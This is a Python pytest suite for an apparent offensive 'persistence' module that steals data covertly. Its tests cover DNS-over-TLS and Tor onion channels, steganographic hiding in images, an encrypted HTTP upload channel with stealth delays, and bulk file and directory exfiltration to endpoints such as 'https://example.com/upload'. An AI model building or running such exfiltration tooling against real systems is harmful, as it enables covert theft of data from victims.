#!/usr/bin/env python3
"""
Test suite for data exfiltration channels
"""

import pytest
import asyncio
import tempfile
import os
from pathlib import Path
import sys

# Add src to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent / "src"))

from persistence.data_exfiltration import (
    DataExfiltrationManager, ExfiltrationMethod, ExfiltrationConfig,
    DNSOverTLSExfiltrator, HTTPSOnionExfiltrator, SteganographicExfiltrator,
    EncryptedChannelExfiltrator, ExfiltrationResult, ChannelStatus
)


class TestDNSOverTLSExfiltrator:
    """Test DNS-over-TLS exfiltration functionality"""
    
    @pytest.fixture
    def exfiltrator(self):
        return DNSOverTLSExfiltrator()
    
    def test_initialization(self, exfiltrator):
        """Test DNS-over-TLS exfiltrator initialization"""
        assert exfiltrator.dns_servers is not None
        assert len(exfiltrator.dns_servers) > 0
        assert exfiltrator.active_connections == {}
    
    @pytest.mark.asyncio
    async def test_connection_establishment(self, exfiltrator):
        """Test DNS-over-TLS connection establishment"""
        # Note: This test may fail without proper DNS-over-TLS server
        # In a real environment, you'd use a test DNS server
        connection_id = await exfiltrator.establish_connection("1.1.1.1", "test.com")
        
        if connection_id:
            assert connection_id in exfiltrator.active_connections
            await exfiltrator.close_connection(connection_id)
            assert connection_id not in exfiltrator.active_connections


class TestHTTPSOnionExfiltrator:
    """Test HTTPS onion routing exfiltration functionality"""
    
    @pytest.fixture
    def exfiltrator(self):
        return HTTPSOnionExfiltrator()
    
    def test_initialization(self, exfiltrator):
        """Test HTTPS onion exfiltrator initialization"""
        assert exfiltrator.onion_services is not None
        assert len(exfiltrator.onion_services) > 0
        assert exfiltrator.socks_proxy == "socks5://127.0.0.1:9050"
        assert exfiltrator.session is None
    
    @pytest.mark.asyncio
    async def test_session_initialization(self, exfiltrator):
        """Test Tor session initialization"""
        # Note: This test requires Tor to be running
        success = await exfiltrator.initialize_session()
        
        if success:
            assert exfiltrator.session is not None
            await exfiltrator.close_session()
            assert exfiltrator.session is None


class TestSteganographicExfiltrator:
    """Test steganographic data hiding functionality"""
    
    @pytest.fixture
    def exfiltrator(self):
        return SteganographicExfiltrator()
    
    @pytest.fixture
    def test_image(self):
        """Create a test image for steganography"""
        from PIL import Image
        import numpy as np
        
        # Create a simple test image
        image_array = np.random.randint(0, 256, (100, 100, 3), dtype=np.uint8)
        image = Image.fromarray(image_array)
        
        with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as f:
            image.save(f.name)
            yield f.name
        
        # Cleanup
        os.unlink(f.name)
    
    def test_initialization(self, exfiltrator):
        """Test steganographic exfiltrator initialization"""
        assert exfiltrator.supported_formats is not None
        assert '.png' in exfiltrator.supported_formats
        assert '.jpg' in exfiltrator.supported_formats
    
    def test_data_hiding_and_extraction(self, exfiltrator, test_image):
        """Test data hiding and extraction in images"""
        test_data = b"Secret message for steganography test"
        
        with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as output_file:
            output_path = output_file.name
        
        try:
            # Hide data in image
            success = exfiltrator.hide_data_in_image(test_image, test_data, output_path)
            assert success is True
            assert os.path.exists(output_path)
            
            # Extract data from image
            extracted_data = exfiltrator.extract_data_from_image(output_path)
            assert extracted_data == test_data
            
        finally:
            # Cleanup
            if os.path.exists(output_path):
                os.unlink(output_path)
    
    def test_large_data_handling(self, exfiltrator, test_image):
        """Test handling of data too large for image"""
        # Create data larger than image capacity
        large_data = b"x" * 100000  # 100KB of data
        
        with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as output_file:
            output_path = output_file.name
        
        try:
            # This should fail due to image size limitations
            success = exfiltrator.hide_data_in_image(test_image, large_data, output_path)
            assert success is False
            
        finally:
            # Cleanup
            if os.path.exists(output_path):
                os.unlink(output_path)


class TestEncryptedChannelExfiltrator:
    """Test encrypted channel exfiltration functionality"""
    
    @pytest.fixture
    def config(self):
        return ExfiltrationConfig(
            compression=True,
            chunk_size=1024,
            retry_attempts=2,
            stealth_delay=0.1,
            fallback_enabled=True
        )
    
    @pytest.fixture
    def exfiltrator(self, config):
        return EncryptedChannelExfiltrator(config)
    
    def test_initialization(self, exfiltrator, config):
        """Test encrypted channel exfiltrator initialization"""
        assert exfiltrator.config == config
        assert exfiltrator.channels == {}
        assert exfiltrator.encryption_key is not None
        assert exfiltrator.cipher is not None
    
    def test_channel_creation(self, exfiltrator):
        """Test encrypted channel creation"""
        channel_id = exfiltrator.create_channel(
            ExfiltrationMethod.ENCRYPTED_CHANNEL,
            "https://example.com/upload"
        )
        
        assert channel_id in exfiltrator.channels
        channel = exfiltrator.channels[channel_id]
        assert channel.method == ExfiltrationMethod.ENCRYPTED_CHANNEL
        assert channel.endpoint == "https://example.com/upload"
        assert channel.status == ChannelStatus.ACTIVE
    
    @pytest.mark.asyncio
    async def test_fallback_http_exfiltration(self, exfiltrator):
        """Test fallback HTTP exfiltration"""
        test_data = b"Test data for fallback HTTP exfiltration"
        
        # This should use the fallback HTTP method
        success = await exfiltrator._exfiltrate_fallback_http(test_data)
        
        # Note: This may fail without internet connection
        # In a real test environment, you'd mock the HTTP requests
        assert isinstance(success, bool)


class TestDataExfiltrationManager:
    """Test main data exfiltration manager functionality"""
    
    @pytest.fixture
    def config(self):
        return ExfiltrationConfig(
            methods=[ExfiltrationMethod.FALLBACK_HTTP],
            compression=True,
            stealth_delay=0.1
        )
    
    @pytest.fixture
    def manager(self, config):
        return DataExfiltrationManager(config)
    
    @pytest.fixture
    def test_file(self):
        """Create a test file for exfiltration"""
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt') as f:
            f.write("This is test data for file exfiltration")
            yield f.name
        
        # Cleanup
        os.unlink(f.name)
    
    def test_initialization(self, manager, config):
        """Test data exfiltration manager initialization"""
        assert manager.config == config
        assert manager.dns_exfiltrator is not None
        assert manager.onion_exfiltrator is not None
        assert manager.stego_exfiltrator is not None
        assert manager.encrypted_exfiltrator is not None
        assert manager.active_operations == {}
    
    @pytest.mark.asyncio
    async def test_file_exfiltration(self, manager, test_file):
        """Test file exfiltration functionality"""
        result = await manager.exfiltrate_file(test_file)
        
        assert isinstance(result, ExfiltrationResult)
        assert result.channel_id is not None
        assert result.method is not None
        assert result.bytes_transferred >= 0
        assert result.duration >= 0
    
    @pytest.mark.asyncio
    async def test_directory_exfiltration(self, manager):
        """Test directory exfiltration functionality"""
        # Create temporary directory with test files
        with tempfile.TemporaryDirectory() as temp_dir:
            # Create test files
            test_files = ['test1.txt', 'test2.txt', 'test3.pdf']
            for filename in test_files:
                file_path = Path(temp_dir) / filename
                file_path.write_text(f"Test content for {filename}")
            
            # Test directory exfiltration
            results = await manager.exfiltrate_directory(temp_dir, ['*.txt', '*.pdf'])
            
            assert isinstance(results, list)
            assert len(results) >= 0  # May be 0 if all methods fail
            
            for result in results:
                assert isinstance(result, ExfiltrationResult)
    
    def test_channel_status(self, manager):
        """Test channel status reporting"""
        status = manager.get_channel_status()
        
        assert isinstance(status, dict)
        assert 'dns_connections' in status
        assert 'onion_session_active' in status
        assert 'encrypted_channels' in status
        assert 'active_operations' in status
    
    @pytest.mark.asyncio
    async def test_cleanup(self, manager):
        """Test cleanup functionality"""
        # This should not raise any exceptions
        await manager.cleanup()


class TestExfiltrationConfig:
    """Test exfiltration configuration"""
    
    def test_default_config(self):
        """Test default configuration values"""
        config = ExfiltrationConfig()
        
        assert config.methods == []
        assert config.encryption_key is None
        assert config.compression is True
        assert config.chunk_size == 1024
        assert config.retry_attempts == 3
        assert config.stealth_delay == 1.0
        assert config.fallback_enabled is True
        assert config.max_bandwidth == 1024 * 1024
    
    def test_custom_config(self):
        """Test custom configuration values"""
        methods = [ExfiltrationMethod.DNS_OVER_TLS, ExfiltrationMethod.HTTPS_ONION]
        config = ExfiltrationConfig(
            methods=methods,
            compression=False,
            chunk_size=2048,
            retry_attempts=5,
            stealth_delay=2.0,
            fallback_enabled=False,
            max_bandwidth=512 * 1024
        )
        
        assert config.methods == methods
        assert config.compression is False
        assert config.chunk_size == 2048
        assert config.retry_attempts == 5
        assert config.stealth_delay == 2.0
        assert config.fallback_enabled is False
        assert config.max_bandwidth == 512 * 1024


if __name__ == "__main__":
    # Run tests
    pytest.main([__file__, "-v"])
